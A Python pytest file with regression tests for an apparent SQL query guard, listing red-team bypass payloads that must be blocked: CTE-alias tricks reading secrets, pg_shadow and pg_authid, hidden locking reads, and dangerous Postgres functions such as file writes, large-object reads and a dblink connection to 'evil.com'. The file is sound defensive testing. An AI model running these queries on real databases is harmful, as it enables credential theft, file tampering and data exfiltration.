"""Regression tests for escapes found by the adversarial red-team workflow.

Each BLOCK payload here is a confirmed escape (a dangerous query that previously
returned PASS/TRANSFORM). The CONTROL payloads must keep passing so the fixes
don't over-block legitimate queries.
"""
from __future__ import annotations

import pytest

from ko_sqlguard import GuardPolicy, Verdict, check

POLICY = GuardPolicy(
    allowed_tables={"orders": [], "customers": ["id", "name", "email"]},
    default_limit=1000,
    max_limit=10000,
)


def _verdict(sql: str) -> Verdict:
    return check(sql, policy=POLICY).verdict


# --- Bug 1: CTE-alias scope confusion -> out-of-allowlist table reads ---

CTE_SCOPE_BYPASS = [
    "SELECT * FROM secrets WHERE id IN (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets)",
    "SELECT secret FROM secrets WHERE id IN (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets)",
    "SELECT s.secret FROM secrets s WHERE s.id IN (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets)",
    "(WITH secrets AS (SELECT 1 a) SELECT a FROM secrets) UNION (SELECT secret FROM secrets)",
    "SELECT passwd FROM pg_shadow WHERE usename IN (WITH pg_shadow AS (SELECT 1) SELECT 1 FROM pg_shadow)",
    "SELECT * FROM pg_authid WHERE rolname IN (WITH pg_authid AS (SELECT 1) SELECT 1 FROM pg_authid)",
    "SELECT * FROM pg_user WHERE usename IN (WITH pg_user AS (SELECT 1) SELECT 1)",
    "SELECT s.secret FROM secrets s, orders o "
    "WHERE s.id=o.id AND o.id IN (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets)",
    "SELECT secret FROM secrets WHERE id = (WITH secrets(id) AS (VALUES(1)) SELECT id FROM secrets)",
    "SELECT * FROM secrets WHERE id NOT IN "
    "(WITH t AS (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets) SELECT id FROM t)",
]


@pytest.mark.parametrize("sql", CTE_SCOPE_BYPASS, ids=lambda s: s[:40])
def test_cte_scope_bypass_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "table_not_allowed" for v in r.violations), [v.code for v in r.violations]


# --- Bug 2: locking reads hidden behind a parenthesized/subquery wrapper ---

LOCK_BYPASS = [
    "(SELECT * FROM orders) FOR UPDATE",
    "(((SELECT * FROM orders))) FOR UPDATE",
    "(SELECT * FROM orders) FOR SHARE",
    "(SELECT * FROM orders) FOR NO KEY UPDATE",
    "(SELECT * FROM orders) FOR KEY SHARE",
    "(SELECT * FROM orders) FOR UPDATE SKIP LOCKED",
    "(SELECT * FROM orders) FOR UPDATE NOWAIT",
    "(SELECT id, name FROM customers) FOR UPDATE",
    "(WITH c AS (SELECT 1) SELECT * FROM orders) FOR UPDATE",
    "(SELECT id FROM customers WHERE id=1) FOR NO KEY UPDATE OF customers",
]


@pytest.mark.parametrize("sql", LOCK_BYPASS, ids=lambda s: s[:40])
def test_locking_read_bypass_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "locking_read" for v in r.violations), [v.code for v in r.violations]


# --- Bug 3: dangerous functions missing from the default blocklist ---

DANGEROUS_FUNCTIONS = [
    "SELECT pg_file_write('/tmp/x', 'data', false)",
    "SELECT pg_file_unlink('/tmp/x')",
    "SELECT pg_file_rename('/a','/b')",
    "SELECT lo_put(1, 0, 'x')",
    "SELECT lo_get(16384)",
    "SELECT lo_from_bytea(0, 'abc')",
    "SELECT lo_creat(-1)",
    "SELECT lo_unlink(1)",
    "SELECT loread(lo_open(1234, 262144), 100000)",
    "SELECT pg_ls_logdir()",
    "SELECT pg_ls_waldir()",
    "SELECT pg_ls_tmpdir()",
    "SELECT pg_logdir_ls()",
    "SELECT pg_stat_get_activity(NULL)",
    "SELECT current_setting('is_superuser')",
    "SELECT setval('orders_id_seq', 999999999)",
    "SELECT nextval('seq')",
    "SELECT pg_advisory_lock(1)",
    "SELECT pg_advisory_xact_lock(42)",
    "SELECT pg_promote()",
    "SELECT pg_switch_wal()",
    "SELECT pg_drop_replication_slot('s')",
    "SELECT pg_create_restore_point('x')",
    "SELECT pg_backup_start('x')",
    "SELECT pg_stat_reset()",
    "SELECT pg_relation_filepath('orders')",
    "SELECT pg_current_logfile()",
    "SELECT inet_server_addr(), inet_server_port()",
    "SELECT pg_database_size('postgres')",
    "SELECT dblink_connect_u('h', 'host=evil.com user=postgres')",
    "SELECT dblink_send_query('conn', 'SELECT * FROM secrets')",
    "SELECT dblink_get_result('conn')",
    "SELECT query_to_xmlschema('SELECT * FROM secrets', true, true, '')",
    "SELECT convert_from(lo_get(1), 'UTF8')",
    "SELECT * FROM orders WHERE id = (SELECT lo_get(1))",
]


@pytest.mark.parametrize("sql", DANGEROUS_FUNCTIONS, ids=lambda s: s[:40])
def test_dangerous_function_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "blocked_function" for v in r.violations), [v.code for v in r.violations]


# --- Bug 4: FETCH FIRST is a LIMIT equivalent and must be capped ---

def test_fetch_first_is_capped() -> None:
    r = check("SELECT * FROM orders FETCH FIRST 1000000000 ROWS ONLY", policy=POLICY)
    assert r.verdict is Verdict.TRANSFORM
    assert any(v.code == "limit_capped" for v in r.violations), [v.code for v in r.violations]
    assert "1000000000" not in (r.sql or "")


def test_reasonable_fetch_first_left_alone() -> None:
    r = check("SELECT * FROM orders FETCH FIRST 50 ROWS ONLY", policy=POLICY)
    assert not any(v.code == "limit_capped" for v in r.violations)


# --- Controls: fixes must NOT over-block legitimate queries ---

CONTROLS_OK = [
    "WITH secrets AS (SELECT 1 id) SELECT * FROM secrets",   # benign same-scope CTE shadow
    "WITH r AS (SELECT * FROM orders) SELECT * FROM r",      # normal CTE over allowed table
    "SELECT id, name FROM customers WHERE id = 1",
    "SELECT generate_series(1, 100)",                        # legit set-returning function
    "SELECT repeat('-', 10)",                                # legit string function
    "SELECT count(*) FROM orders",
    "SELECT o.id FROM orders o JOIN customers c ON o.id = c.id",
]


@pytest.mark.parametrize("sql", CONTROLS_OK, ids=lambda s: s[:40])
def test_controls_still_allowed(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is not Verdict.BLOCK, [v.model_dump() for v in r.violations]
